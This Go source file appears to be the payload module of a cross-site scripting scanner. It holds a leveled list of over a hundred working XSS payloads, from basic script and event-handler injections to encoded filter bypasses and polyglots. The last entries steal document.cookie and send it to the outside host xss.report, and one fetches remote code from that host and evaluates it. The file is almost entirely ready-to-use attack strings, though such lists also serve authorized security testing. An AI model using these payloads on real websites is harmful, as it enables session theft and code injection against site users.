package payload

type PayloadEntry struct {
	Value    string
	Level    int
	Category string
	XSSType  string
}

func GetPayloads(level int) []PayloadEntry {
	var result []PayloadEntry
	for _, p := range AllPayloads {
		if p.Level <= level {
			result = append(result, p)
		}
	}
	return result
}

func LevelName(level int) string {
	switch level {
	case 1:
		return "Basic"
	case 2:
		return "Medium"
	case 3:
		return "Advanced"
	case 4:
		return "Expert"
	case 5:
		return "Full"
	}
	return "Unknown"
}

var AllPayloads = []PayloadEntry{

	{`<script>alert(1)</script>`, 1, "BasicScript", "Reflected"},
	{`<script>alert('XSS')</script>`, 1, "BasicScript", "Reflected"},
	{`<script>confirm(1)</script>`, 1, "BasicScript", "Reflected"},
	{`<script>prompt(1)</script>`, 1, "BasicScript", "Reflected"},
	{`<script>alert(document.domain)</script>`, 1, "BasicScript", "Reflected"},
	{`<script>alert(document.cookie)</script>`, 1, "BasicScript", "Reflected"},
	{`<b onmouseover=alert(1)>hover</b>`, 1, "EventHandler", "Reflected"},
	{`<img src=x onerror=alert(1)>`, 1, "ImgTag", "Reflected"},
	{`<img src=x onerror=alert('XSS')>`, 1, "ImgTag", "Reflected"},
	{`<svg onload=alert(1)>`, 1, "SVGTag", "Reflected"},
	{`"><script>alert(1)</script>`, 1, "BreakOut", "Reflected"},
	{`'><script>alert(1)</script>`, 1, "BreakOut", "Reflected"},
	{`</script><script>alert(1)</script>`, 1, "ScriptBreak", "Reflected"},

	{`<ScRiPt>alert(1)</sCriPt>`, 2, "CaseMix", "Reflected"},
	{`<SCRIPT>alert(1)</SCRIPT>`, 2, "CaseMix", "Reflected"},
	{`<img/src=x onerror=alert(1)>`, 2, "ImgNoSpace", "Reflected"},
	{`<img src=x onerror="alert(1)">`, 2, "ImgQuoted", "Reflected"},
	{`<body onload=alert(1)>`, 2, "BodyTag", "Reflected"},
	{`<input autofocus onfocus=alert(1)>`, 2, "InputFocus", "Reflected"},
	{`<select autofocus onfocus=alert(1)>`, 2, "SelectFocus", "Reflected"},
	{`<textarea autofocus onfocus=alert(1)>`, 2, "TextareaFocus", "Reflected"},
	{`<keygen autofocus onfocus=alert(1)>`, 2, "KeygenFocus", "Reflected"},
	{`<video src=x onerror=alert(1)>`, 2, "VideoTag", "Reflected"},
	{`<audio src=x onerror=alert(1)>`, 2, "AudioTag", "Reflected"},
	{`<details open ontoggle=alert(1)>`, 2, "DetailsTag", "Reflected"},
	{`<marquee onstart=alert(1)>`, 2, "MarqueeTag", "Reflected"},
	{`<object data="javascript:alert(1)">`, 2, "ObjectTag", "Reflected"},
	{`<a href="javascript:alert(1)">click</a>`, 2, "HrefJS", "Reflected"},
	{`<a href=javascript:alert(1)>click</a>`, 2, "HrefJS", "Reflected"},
	{`" onmouseover="alert(1)`, 2, "AttrBreak", "Reflected"},
	{`' onmouseover='alert(1)`, 2, "AttrBreak", "Reflected"},
	{`"><img src=x onerror=alert(1)>`, 2, "TagBreak", "Reflected"},
	{`'><img src=x onerror=alert(1)>`, 2, "TagBreak", "Reflected"},
	{`</title><script>alert(1)</script>`, 2, "TitleBreak", "Reflected"},
	{`</textarea><script>alert(1)</script>`, 2, "TextareaBreak", "Reflected"},
	{`</style><script>alert(1)</script>`, 2, "StyleBreak", "Reflected"},

	{`<script>alert(String.fromCharCode(88,83,83))</script>`, 3, "CharCode", "Reflected"},
	{`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, 3, "Base64Eval", "Reflected"},
	{`<svg><script>alert&#40;1&#41;</script>`, 3, "HTMLEntity", "Reflected"},
	{`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, 3, "EntityEncoded", "Reflected"},
	{`<script>\u0061\u006C\u0065\u0072\u0074(1)</script>`, 3, "UnicodeEscape", "Reflected"},
	{`<script>window['al'+'ert'](1)</script>`, 3, "StringConcat", "Reflected"},
	{`<script>window['\x61\x6c\x65\x72\x74'](1)</script>`, 3, "HexEscape", "Reflected"},
	{`<script>setTimeout('alert(1)',0)</script>`, 3, "Timeout", "Reflected"},
	{`<script>setInterval('alert(1)',9999999)</script>`, 3, "Interval", "Reflected"},
	{`<script>Function('alert(1)')()</script>`, 3, "FunctionCtor", "Reflected"},
	{`<script>(()=>{alert(1)})()</script>`, 3, "ArrowIIFE", "Reflected"},
	{"<script>new Function`alert(1)`()</script>", 3, "TemplateLiteral", "Reflected"},
	{`<svg><animate onbegin=alert(1) attributeName=x></svg>`, 3, "SVGAnimate", "Reflected"},
	{`<svg><set attributeName=onmouseover value=alert(1)></svg>`, 3, "SVGSet", "Reflected"},
	{`<math><mtext></p><img src=x onerror=alert(1)>`, 3, "MathMLContext", "Reflected"},
	{`<table><td background="javascript:alert(1)">`, 3, "TableBackground", "Reflected"},
	{`<div style="background:url(javascript:alert(1))">`, 3, "CSSBackground", "Reflected"},
	{`<style>@import 'javascript:alert(1)'</style>`, 3, "CSSImport", "Reflected"},
	{`<link rel=stylesheet href="javascript:alert(1)">`, 3, "LinkTag", "Reflected"},
	{`%3Cscript%3Ealert(1)%3C/script%3E`, 3, "URLEncoded", "Reflected"},
	{`%3Cimg+src%3Dx+onerror%3Dalert(1)%3E`, 3, "URLEncodedImg", "Reflected"},
	{`<script>alert(1)//`, 3, "CommentBypass", "Reflected"},
	{`<script>alert(1)/*`, 3, "BlockCommentBypass", "Reflected"},
	{`"><script >alert(1)</script >`, 3, "SpaceBypass", "Reflected"},
	{`<scr<script>ipt>alert(1)</scr</script>ipt>`, 3, "DoubleTagBypass", "Reflected"},

	{`';alert(1)//`, 4, "JSContextBreak", "DOM"},
	{`";alert(1)//`, 4, "JSContextBreak", "DOM"},
	{"`);alert(1)//", 4, "JSContextBreak", "DOM"},
	{`\';alert(1)//`, 4, "JSEscapeBreak", "DOM"},
	{`</script><svg onload=alert(1)>`, 4, "ScriptSVGChain", "DOM"},
	{`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`, 4, "Polyglot", "DOM"},
	{`'onmouseover='alert(1)`, 4, "AttrInjection", "DOM"},
	{`"onmouseover="alert(1)`, 4, "AttrInjection", "DOM"},
	{`<iframe src="javascript:alert(1)">`, 4, "IframeJS", "DOM"},
	{`<iframe srcdoc="<script>alert(1)</script>">`, 4, "IframeSrcdoc", "DOM"},
	{`<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">`, 4, "IframeSrcdocEncoded", "DOM"},
	{`<base href="javascript:alert(1)//"><a href="/x">click</a>`, 4, "BaseTag", "DOM"},
	{`<script>location='javascript:alert(1)'</script>`, 4, "LocationJS", "DOM"},
	{`<script>location.href='javascript:alert(1)'</script>`, 4, "LocationHref", "DOM"},
	{`<script>document.write('<img src=x onerror=alert(1)>')</script>`, 4, "DocWrite", "DOM"},
	{`<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>`, 4, "InnerHTML", "DOM"},
	{`<script>eval(location.hash.slice(1))</script>`, 4, "HashEval", "DOM"},
	{`#<script>alert(1)</script>`, 4, "HashFragment", "DOM"},
	{`<script>var x=document.createElement('script');x.src='data:,alert(1)';document.body.appendChild(x)</script>`, 4, "DOMScriptInject", "DOM"},
	{`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`, 4, "MetaRefresh", "Reflected"},
	{`<form action="javascript:alert(1)"><input type=submit>`, 4, "FormAction", "Reflected"},
	{`<button formaction="javascript:alert(1)">x</button>`, 4, "ButtonFormaction", "Reflected"},
	{`<isindex action="javascript:alert(1)" type=image>`, 4, "IsIndex", "Reflected"},
	{`<script>Object.defineProperty(document,'cookie',{get:function(){alert(1)}});</script>`, 4, "PropertyHijack", "DOM"},
	{`<img src=1 href=1 onerror="javascript:alert(1)"></img>`, 4, "ImgHref", "Reflected"},
	{`<audio><source onerror="javascript:alert(1)">`, 4, "AudioSource", "Reflected"},
	{`<video><source onerror="javascript:alert(1)">`, 4, "VideoSource", "Reflected"},
	{`<input type="image" src=1 onerror="alert(1)">`, 4, "InputImage", "Reflected"},
	{`<script>window.onerror=alert;throw 1</script>`, 4, "WindowOnError", "DOM"},
	{`<script>with(document)body.appendChild(createElement('script')).src='data:,alert(1)'</script>`, 4, "WithStatement", "DOM"},
	{`<script>({}).constructor.constructor('alert(1)')()</script>`, 4, "ProtoConstructor", "DOM"},
	{`<script>[].map.constructor('alert(1)')()</script>`, 4, "ArrayConstructor", "DOM"},
	{`<script>[]['\x66\x69\x6C\x74\x65\x72']['\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72']('\x61\x6C\x65\x72\x74\x28\x31\x29')()</script>`, 4, "ArrayFilterHex", "DOM"},

	{"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>", 5, "UltimatePolyglot", "Polyglot"},
	{`'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><Script>prompt(1)</Script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">`, 5, "MegaPolyglot", "Polyglot"},
	{`<script>for(;;){alert(1)}</script>`, 5, "InfiniteLoop", "Reflected"},
	{`<script>throw{message:alert(1)}</script>`, 5, "ThrowExpr", "DOM"},
	{`<script>import('data:text/javascript,alert(1)')</script>`, 5, "DynamicImport", "DOM"},
	{"<script>import(`data:text/javascript,alert(1)`)</script>", 5, "DynamicImportTemplate", "DOM"},
	{`<script>Reflect.apply(alert,[null,[1]])</script>`, 5, "ReflectApply", "DOM"},
	{`<script>Proxy&&new Proxy({},{get:function(){alert(1)}})+''</script>`, 5, "ProxyTrap", "DOM"},
	{`<script>async function x(){await import('data:text/javascript,alert(1)')}x()</script>`, 5, "AsyncImport", "DOM"},
	{`<script>Symbol.hasInstance&&(class{static[Symbol.hasInstance](){alert(1)}}[Symbol.hasInstance]())</script>`, 5, "SymbolHasInstance", "DOM"},
	{`<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">`, 5, "SVGUseHref", "DOM"},
	{`<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+I3gi">`, 5, "SVGUseBase64", "DOM"},
	{`<!--<img src="--><img src=x onerror=alert(1)//">`, 5, "CommentBreak", "Reflected"},
	{`<![CDATA[><script>alert(1)</script>]]>`, 5, "CDATABreak", "Reflected"},
	{"<script>location=`javascript:alert(1)`</script>", 5, "LocationTemplate", "DOM"},
	{`<xss onafterscriptexecute=alert(1)><script>1</script>`, 5, "AfterScript", "Reflected"},
	{`<xss onbeforescriptexecute=alert(1)><script>1</script>`, 5, "BeforeScript", "Reflected"},
	{`<script>history.pushState('','','/');location='javascript:alert(1)'</script>`, 5, "HistoryPushState", "DOM"},
	{`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`, 5, "NoscriptBreak", "Reflected"},
	{`<script charset="x-imap4-modified-utf7">alert+ADw-1+AD4-</script>`, 5, "CharsetBypass", "Reflected"},
	{`<script>window.__proto__.toString=alert;window+''</script>`, 5, "ProtoToString", "DOM"},
	{`<div id="x">X</div><script>document.getElementById('x').outerHTML='<img src=x onerror=alert(1)>'</script>`, 5, "OuterHTML", "DOM"},
	{`<script>fetch('https://xss.report/c/demo').then(r=>r.text()).then(eval)</script>`, 5, "FetchEval", "Blind"},
	{`<script>new Image().src='//xss.report/c/demo?c='+document.cookie</script>`, 5, "CookieExfil", "Blind"},
	{`"><script>document.location='//xss.report/c/demo?c='+document.cookie</script>`, 5, "CookieExfilBreak", "Blind"},
	{`<script>var x=new XMLHttpRequest();x.open('GET','//xss.report/c/demo?c='+document.cookie,true);x.send()</script>`, 5, "XHRExfil", "Blind"},
}
